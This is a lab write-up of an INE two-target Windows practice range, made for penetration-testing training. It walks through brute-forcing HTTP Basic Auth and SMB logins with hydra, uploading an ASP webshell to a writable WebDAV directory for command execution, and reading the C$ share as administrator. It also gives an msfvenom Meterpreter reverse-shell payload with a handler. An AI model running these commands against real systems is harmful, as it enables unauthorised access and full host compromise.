---
title: "INE Windows CTF 1"
date: 2026-10-14
categories: [INE, Lab]
tags: [windows, iis, webdav, http basic auth, password brute force, credential reuse, webshell, asp, arbitrary file upload, RCE, smb, nmap, hydra, crackmapexec, curl, gobuster, davtest, cadaver, smbclient, metasploit, msfvenom]
image:
  path: /assets/img/INE/banner.webp
  lqip: "data:image/webp;base64,UklGRvYBAABXRUJQVlA4WAoAAAAQAAAAHwAACQAAQUxQSBsBAAABkGvb2rFX+3vf2LZt6/v/kcq2bds2S7W2U2WkykjLe7BtnxPnGiIiAQIK35cqQvA34aEE3wxAmeDLEvDK6Blb2LH2HEcTdRk+fDMAo8GCAK6O0TlBWlpqKtru1qrO4SlFVZkcbYCCEL9EqPvddw4/3VQD0LlLjjx5/9miBAKK0hQT3ffmseuF9xpQ0/fytZuU1NTEuIQE53ofUGi3REL1f8vUPibe42H5v3z5un/we0CGpyoT9uHcIEb9vWXylAiuvHPk3yuWXjd3dna2dzYNgXLDHgR4Qf1f88QhD5R2L0v+lW8cOLAclmW5ogAWnUivDtTfO+avGQKL3ff3wub3X1xQ4gvxVgKhKDNuAEChGBCtz3hGRnxHyoABAFZQOCC0AAAAEAQAnQEqIAAKAD7tYqpNqaWkIjAIATAdiWwAnS+PQAAckstmKzupqwQA/GAJj2rSsnYxXiIloZL4anV4YKPl3LHLvC5WLeJrDpnIPzMmd6LmX/pjUq/q5r1XGy4yigyPOyI1a1GJgQxa46PmT/1+xE/HXrwQ7OTEzbZr3K34pzTG4RCmid2FltrXI9eU4lqAE0H9ax/8f8/3/upMBKkfw2JGWEDjl+D/4/63ebP9L9oX4BAA"
  alt: INE Windows CTF 1 writeup
attack_path: false
---

This is a practice lab from INE's *Host & Network Penetration Testing: System-Host Based Attacks* course — not a ranked box but a **two-target Windows range** for drilling the standard Windows attack surface, so this writeup leans into *how* each tool is used rather than one clever trick. **Target 1** is an IIS server whose HTTP Basic Auth falls to a weak password, exposing a writable **WebDAV** directory that executes uploaded **ASP** — the classic webshell-to-RCE. **Target 2** is a Windows Server whose SMB accounts fall to a credential brute-force, handing over administrator access to the `C$` share and the remaining flags.

| Field      | Details        |
|------------|----------------|
| Platform   | INE            |
| Difficulty | Lab            |
| OS         | Windows Server 2019 |
| Targets    | target1 (10.2.19.188) · target2 (10.2.28.91) |
| Date       | October 2026   |

## Tools Used

| Tool         | Description                                                           |
|--------------|-----------------------------------------------------------------------|
| nmap         | Port scanning and service fingerprinting of both targets             |
| hydra        | Brute-forced HTTP Basic Auth (target 1) and SMB logins (target 2)    |
| crackmapexec | Validated the recovered credentials over SMB                         |
| curl         | Authenticated requests to IIS/WebDAV and triggering the webshell     |
| gobuster     | Authenticated directory brute-force that found `/webdav/`            |
| davtest      | Tested which uploaded file extensions actually execute on WebDAV     |
| cadaver      | WebDAV client used to upload the ASP webshell                        |
| smbclient    | Browsed target 2's `C$` administrative share                         |
| msfvenom     | Generated the aspx Meterpreter payload (alternative route)           |
| Metasploit   | `multi/handler` and `smb_login` — the framework equivalents          |

Both targets are reached by name after mapping them in `/etc/hosts`:

```text
10.2.19.188    target1.ine.local
10.2.28.91     target2.ine.local
```

> The lab reassigns each target's IP when the range is reset, so a few raw command outputs below show different addresses (e.g. target 2 as `10.2.18.174`, or target 1's own internal NAT address `10.2.16.156`). They all refer to the two hosts above.

## Target 1 — IIS & WebDAV (10.2.19.188)

### Port Scan

```bash
nmap -p- --min-rate 5000 -sCV -Pn -n -oN nmap1 10.2.19.188
```

```bash
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-auth: Basic realm=10.2.19.188
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

The standout is **IIS 10 on port 80 behind HTTP Basic Auth** (`401 Unauthorized`). The lab brief notes that a user **`bob`** has a weak password — so the realm is a brute-force target, and WinRM/RDP/SMB give places to reuse whatever we recover.

### Cracking the HTTP Basic Auth with hydra

`hydra`'s `http-get` module replays `GET /` with `Authorization: Basic` headers from a wordlist. `-l` fixes the login to `bob`, `-P` supplies the password list:

```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt http-get://10.2.19.188
```

```bash
[80][http-get] host: 10.2.19.188   login: bob   password: password_123321
```

(The `[WARNING] ... default path set to /` just means hydra tested the site root, which is exactly the protected resource here.) So the credential is **`bob:password_123321`**. Since `bob` is a local Windows account, it's worth checking that the same password works on SMB — `crackmapexec` confirms it in one line:

```bash
crackmapexec smb target1.ine.local -u 'bob' -p 'password_123321'
# [+] EC2AMAZ-JVD17HK\bob:password_123321
```

### Finding WebDAV with an authenticated gobuster

Authenticating with `curl -u` returns the default IIS landing page — unremarkable on its own, so the next step is content discovery. `gobuster`'s `-U`/`-P` flags carry the Basic Auth credentials into every request so the scan isn't just bouncing off 401s:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u http://target1.ine.local/ -U 'bob' -P 'password_123321'
```

```bash
/webdav               (Status: 301) [--> http://target1.ine.local/webdav/]
```

A **`/webdav/`** directory on an IIS box is a strong lead: WebDAV is HTTP's file-management extension, and if it allows writes *and* the server executes what you write, it's remote code execution.

### Enumerating the WebDAV share

```bash
curl -X GET http://target1.ine.local/webdav/ -u "bob:password_123321"
```

```text
flag1.txt    readme.txt    test.asp    web.config
```

```bash
curl http://target1.ine.local/webdav/flag1.txt -u "bob:password_123321"   # REDACTED
curl http://target1.ine.local/webdav/test.asp  -u "bob:password_123321"
# Classic ASP is enabled and working!
```

`flag1.txt` is the first flag, and `test.asp` returning *"Classic ASP is enabled and working!"* is the real prize — it proves the directory **executes ASP**, not just serves it.

### Confirming executable extensions with davtest

Before uploading a payload, `davtest` is the right tool to confirm *which* extensions actually run. It `PUT`s a battery of test files (asp, aspx, php, jsp, …) and then requests each one back to see which **execute** versus merely upload:

```bash
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav
```

```text
PUT  asp   SUCCEED
EXEC asp   SUCCEED      <-- executes
EXEC aspx  SUCCEED
EXEC html  SUCCEED
EXEC txt   SUCCEED
```

`.asp` both uploads and executes — so an ASP webshell will give command execution.

### Uploading a webshell with cadaver → RCE

`cadaver` is an interactive command-line WebDAV client — think `ftp`, but over WebDAV. After authenticating, `put` uploads a stock ASP webshell straight into the writable directory:

```bash
cadaver http://target1.ine.local/webdav/
# Username: bob   Password: ********
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
# Progress: [====>] 100.0% succeeded.
```

The webshell takes a `cmd` query parameter, so commands run through a normal authenticated `GET`. URL-encoding `type \flag2.txt` (`%5C` is the backslash) reads the second flag from the drive root:

```bash
curl "http://target1.ine.local/webdav/webshell.asp?cmd=type+%5Cflag2.txt" -u "bob:password_123321"
# ... <PRE> ... REDACTED
```

That is command execution on target 1 as the IIS application-pool identity, and **flag2** in hand.

### Alternative — a Meterpreter payload

For practice, the same upload primitive can deliver a Metasploit payload instead of a text webshell. `msfvenom` builds an `aspx` Meterpreter stager, `cadaver` uploads it, and a `multi/handler` waits:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.0.11 LPORT=4444 -f aspx -o shell.aspx
# dav:/webdav/> put shell.aspx
```

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.1.0.11:4444
```

Requesting `shell.aspx` triggers the callback and the handler **receives the connection**, but the Meterpreter session did not fully stage in this run (a common outcome when a staged x64 payload meets the app-pool context / host defences). The plain ASP webshell above was the reliable route — a useful reminder that the simplest RCE primitive often beats the heavier one.

## Target 2 — SMB Brute-Force (10.2.28.91)

### Port Scan

```bash
nmap -p- --min-rate 5000 -sCV -Pn -n -oN nmap2 10.2.28.91
```

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Datacenter 17763
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          WinRM
```

No web server this time — the surface is **SMB on 445**. With no hint about a specific user, this is a full username *and* password spray.

### Brute-forcing SMB logins with hydra

`hydra`'s `smb` module takes a user list (`-L`) and a password list (`-P`). SMB dislikes parallel connections, so hydra automatically drops to a single task:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local
```

```bash
[445][smb] login: administrator   password: pineapple
[445][smb] login: auditor         password: hellokitty
[445][smb] login: demo            password: password1
```

Three valid accounts, and one of them is **`administrator:pineapple`** — local admin, which is everything we need.

### Reading the C$ share with smbclient

Administrator rights mean the hidden **`C$`** administrative share is readable — that's the whole filesystem. `smbclient` browses it directly:

```bash
smbclient \\\\target2.ine.local\\C$ -U administrator
# Password: pineapple
smb: \> more flag3.txt                                   # REDACTED  (drive root)
smb: \> cd Users\Administrator\Desktop\
smb: \> more flag4.txt                                   # REDACTED  (admin desktop)
```

`flag3.txt` sits at the root of `C:` and `flag4.txt` on the Administrator's Desktop — both read without ever opening an interactive session, since `C$` exposes the disk to any local admin.

### Alternative — Metasploit smb_login

The framework equivalent of the hydra spray is `auxiliary/scanner/smb/smb_login`, which validates a user/password set against SMB (and can feed successes straight into the Metasploit credential store):

```text
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE  .../unix_users.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE  .../unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.2.28.91:445 - Success: '.\administrator:pineapple' Administrator
[+] 10.2.28.91:445 - Success: '.\auditor:hellokitty'
[+] 10.2.28.91:445 - Success: '.\demo:password1'
```

## Flags

| Flag        | Location                                   | Value      |
|-------------|--------------------------------------------|------------|
| `flag1.txt` | Target 1 — `/webdav/`                       | `REDACTED` |
| `flag2.txt` | Target 1 — `C:\` (webshell RCE)             | `REDACTED` |
| `flag3.txt` | Target 2 — `C:\`                            | `REDACTED` |
| `flag4.txt` | Target 2 — Administrator Desktop            | `REDACTED` |

## Key Takeaways

- **A password hint is an invitation to brute-force the right thing.** "bob has a weak password" pointed hydra at the HTTP Basic Auth realm specifically, so a single-user run cracked it in seconds. Scope the attack to the credential you were told exists.
- **The same local credential often spans services.** `bob`'s HTTP Basic Auth password was also his SMB password — `crackmapexec` confirmed the reuse instantly. Always test recovered credentials against every authenticating service in the scan.
- **WebDAV plus executable scripts equals RCE.** The chain is always the same: confirm the directory is writable, use `davtest` to learn which extensions *execute*, then `cadaver` to upload a webshell in one of them. `test.asp` had already revealed Classic ASP was live.
- **Know the manual primitive before the framework one.** The stock ASP webshell gave clean command execution; the Meterpreter `aspx` only got a half-open connection. On a real engagement the lighter, better-understood payload is often more reliable than a staged one.
- **SMB admin access is total via `C$`.** Once the spray returned `administrator:pineapple`, `smbclient \\host\C$` read the entire disk — no shell required. An exposed local-admin password on SMB is a full host compromise.
- **As a lab, the point is tool fluency.** Two hydra modules (`http-get`, `smb`), authenticated `gobuster`, `davtest`, `cadaver`, `crackmapexec`, `smbclient`, and the Metasploit equivalents (`multi/handler`, `smb_login`) — the same building blocks reused across countless Windows targets.
